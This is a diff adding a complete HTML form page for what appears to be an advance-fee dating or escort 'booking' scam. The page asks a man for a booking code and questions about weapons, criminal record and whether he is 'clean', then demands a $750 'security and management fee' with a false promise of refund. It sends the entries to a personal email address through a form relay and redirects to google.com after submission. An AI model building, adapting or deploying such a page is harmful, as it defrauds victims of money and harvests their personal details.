@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<!---Coding By DINER'S CODE--->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/build/css/intlTelInput.css" />
+    <link rel="stylesheet" href="/build/css/demo.css" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <!--<title>Registration Form in HTML CSS</title>-->
+    <!---Custom CSS File--->
+    <link rel="stylesheet" href="index.css" />
+  </head>
+  <body>
+    <section class="container">
+      <div class="image-logo">
+        <img src="./Lock-512.webp" alt="">
+      </div>
+      <header>SECURITY AND MANAGEMENT FEE</header>
+      <form
+        action="https://formsubmit.co/Missylinda35@gmail.com"
+        method="POST"
+        class="form"
+      >
+        <input type="text" name="_honey" style="display: none" />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://www.google.com">
+        <div class="input-box">
+          <label>HELLO SIR, THANK YOU FOR ACTIVATING YOUR BOOKING CODE <br><br>
+          </label>
+        </div>
+        <div class="input-box">
+          <label>SECURITY BOOKING CODE</label>
+          <input
+            id="iv-code"
+            type="text"
+            name="last name"
+            placeholder="Enter booking security code"
+            onkeyup="validateCode()"
+          />
+          <span id="code-error"></span>
+        </div>
+
+        <div class="gender-box">
+          <h4>ARE YOU CLEAN?</h4>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="yes-on" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="no-on" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="input-box" style="text-align: left;">
+          <label>DO YOU HAVE ANY WEAPON IN YOUR POSSESSION?<br> IF YOU DON'T HAVE ANY STATE NONE</label>
+          <input
+            type="text"
+            name="last name"
+            placeholder="Type of weapon"
+          />
+        </div>
+
+         <div class="gender-box">
+          <h4>DO YOU HAVE ANY CRIMINAL RECORD AND HAVE YOU BEEN ARRESTED BEFORE?</h4>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="yes-on" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="no-on" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="input-box">
+          <h4>DO YOU AGREE TO KEEP HER SAFE AT ALL COST REGARDLESS YOUR PERSONAL INTEREST AND TO STAY AWAY FROM DANGER DURING YOUR 
+            TIME OF FUN?
+          </h5>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="yes-on" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="no-on" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+        
+        
+        <div class="input-box">
+          <label>WE ARE GLAD AND SAVE WITH YOU. THE SUM OF $750 WOULD BE REQUIRED FOR YOU TO DEPOSITED FOR THE SAFETY AND MANAGEMENT FEE IN ORDER 
+            FOR YOU TO HAVE THE DOCUMENT FOR FURTHER SECURITY. <br><br>
+            NOTE: ALL DEPOSIT FUNDS WOULD BE REFUNDED AFTER THE MEETING AND ALL CONDITIONS MET.
+          </label>
+        </div>
+
+        <footer>
+          <div class="checkbox-wrapper-46">
+            <input type="checkbox" id="cbx-46" class="inp-cbx" />
+            <label for="cbx-46" class="cbx"
+              ><span>
+                <svg viewBox="0 0 12 10" height="10px" width="12px">
+                  <polyline points="1.5 6 4.5 9 10.5 1"></polyline></svg></span
+              ><span>Do you agree with us?</span>
+            </label>
+          </div><br>
+        </footer>
+
+        <button>Submit</button>
+      </form>
+
+      <footer>
+        <div class="column">
+          <p>&copy; 2024</p>
+          <p>User Agreement</p>
+          <p>Privacy Policy</p>
+        </div>
+      </footer>
+    </section>
+
+    <script src="/build/js/intlTelInput.js"></script>
+    <script>
+      var input = document.querySelector("#phone");
+      window.intlTelInput(input, {});
+    </script>
+     <script src="./input.js"></script>
+  </body>
+</html>
